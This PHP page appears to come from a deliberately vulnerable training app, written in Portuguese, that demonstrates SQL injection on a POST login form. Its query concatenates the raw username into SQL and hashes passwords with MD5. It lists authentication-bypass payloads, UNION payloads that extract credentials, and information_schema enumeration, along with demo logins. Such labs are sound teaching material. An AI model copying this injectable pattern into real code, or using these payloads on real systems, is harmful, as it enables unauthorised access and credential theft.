<?php
defined('APP') or die('Access denied');
include("db.php");
?>

<div class="container mt-4">
    <h3>🔐 SQL Injection - POST Method</h3>

    <div class="alert alert-danger" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página contém vulnerabilidades SQL no método POST para fins educacionais!
    </div>

    <div class="row">
        <div class="col-md-6">
            <div class="card">
                <div class="card-header">
                    <h5>Login Vulnerável</h5>
                </div>
                <div class="card-body">
                    <p>Teste as credenciais ou use payloads SQL injection:</p>

                    <form action="?page=sql-injection-post" method="post">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username</label>
                            <input type="text" name="username" id="username" class="form-control" placeholder="Digite o username..." value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>" required>
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <input type="password" name="password" id="password" class="form-control" placeholder="Digite a senha..." required>
                        </div>
                        <button type="submit" class="btn btn-primary w-100">🔓 Fazer Login</button>
                    </form>

                    <hr>
                    <h6>Credenciais Válidas:</h6>
                    <ul class="list-group list-group-flush">
                        <li class="list-group-item d-flex justify-content-between">
                            <span><strong>admin</strong></span>
                            <span><code>password123</code></span>
                        </li>
                        <li class="list-group-item d-flex justify-content-between">
                            <span><strong>foo</strong></span>
                            <span><code>test</code></span>
                        </li>
                        <li class="list-group-item d-flex justify-content-between">
                            <span><strong>bar</strong></span>
                            <span><code>admin</code></span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="col-md-6">
        <h5>Exemplos de Payloads:</h5>
        <div class="accordion" id="postExamples">
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingAuth">
                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseAuth">
                        Bypass de Autenticação
                    </button>
                </h2>
                <div id="collapseAuth" class="accordion-collapse collapse show" data-bs-parent="#postExamples">
                    <div class="accordion-body">
                        <strong>Método 1 - OR com comentário:</strong><br>
                        Username: <code>admin' OR '1'='1' # </code><br>
                        Password: <code>qualquer</code><br><br>

                        <strong>Método 2 - OR sem comentário:</strong><br>
                        Username: <code>admin' OR 1=1 OR 'a'='</code><br>
                        Password: <code>a</code><br><br>

                        <strong>Método 3 - Usando admin existente:</strong><br>
                        Username: <code>admin</code><br>
                        Password: <code>' OR '1'='1</code>
                    </div>
                </div>
            </div>

            <div class="accordion-item">
                <h2 class="accordion-header" id="headingUnion">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseUnion">
                        Union-based Injection
                    </button>
                </h2>
                <div id="collapseUnion" class="accordion-collapse collapse" data-bs-parent="#postExamples">
                    <div class="accordion-body">
                        <strong>Extrair todos os usuários:</strong><br>
                        Username: <code>admin' UNION SELECT id,username,password,email FROM user # </code><br>
                        Password: <code>qualquer</code><br><br>

                        <strong>Extrair dados concatenados:</strong><br>
                        Username: <code>admin' UNION SELECT 1,concat(username,':',password),'fake@email.com',4 FROM user # </code><br>
                        Password: <code>qualquer</code><br><br>

                        <strong>Descobrir estrutura da tabela:</strong><br>
                        Username: <code>admin' UNION SELECT 1,column_name,'type',table_name FROM information_schema.columns WHERE table_name='user' # </code><br>
                        Password: <code>qualquer</code>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php
    if (isset($_POST['username'])) {
        $username = $_POST['username'];
        $password = md5($_POST['password']);
        $query = "SELECT * FROM user WHERE username = '$username' AND password = '$password'";
        $result = $mysqli->query($query);

        echo "<div class='row mt-4'>";
        echo "<div class='col-md-12'>";
        echo "<div class='card'>";
        echo "<div class='card-header'>";
        echo "<h6>📊 Resultado do Login</h6>";
        echo "<small class='text-muted'>Query executada: <code>" . htmlspecialchars($query) . "</code></small>";
        echo "</div>";
        echo "<div class='card-body'>";

        if ($result !== false) {
            if ($result->num_rows > 0) {
                $_SESSION['username'] = $username;
                echo "<div class='alert alert-success' role='alert'>";
                echo "<strong>✅ Login realizado com sucesso!</strong><br>";
                echo "Usuário autenticado: <strong>" . htmlspecialchars($username) . "</strong>";
                echo "</div>";

                // Mostrar dados encontrados se for um UNION attack
                if ($result->num_rows > 1 || $result->field_count > 4) {
                    echo "<div class='alert alert-warning' role='alert'>";
                    echo "<strong>⚠️ Dados extras detectados (possível UNION injection):</strong>";
                    echo "</div>";
                }

                echo "<div class='table-responsive'>";
                echo "<table class='table table-striped table-sm'>";
                echo "<thead class='table-dark'>";
                echo "<tr>";

                // Get column names dynamically
                $fields = $result->fetch_fields();
                foreach ($fields as $field) {
                    echo "<th>" . htmlspecialchars($field->name) . "</th>";
                }
                echo "</tr>";
                echo "</thead>";
                echo "<tbody>";

                // Reset result pointer and display data
                $result->data_seek(0);
                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    foreach ($row as $value) {
                        echo "<td>" . htmlspecialchars($value) . "</td>";
                    }
                    echo "</tr>";
                }
                echo "</tbody>";
                echo "</table>";
                echo "</div>";
            } else {
                echo "<div class='alert alert-danger' role='alert'>";
                echo "<strong>❌ Falha no login</strong><br>";
                echo "Credenciais inválidas ou usuário não encontrado.";
                echo "</div>";
            }
            $result->free_result();
        } else {
            echo "<div class='alert alert-danger' role='alert'>";
            echo "<strong>💥 Erro na query SQL:</strong><br>";
            echo "<code>" . htmlspecialchars($mysqli->error) . "</code>";
            echo "</div>";
        }

        echo "</div>";
        echo "</div>";
        echo "</div>";
        echo "</div>";

        $mysqli->close();
    }
    ?>
</div>
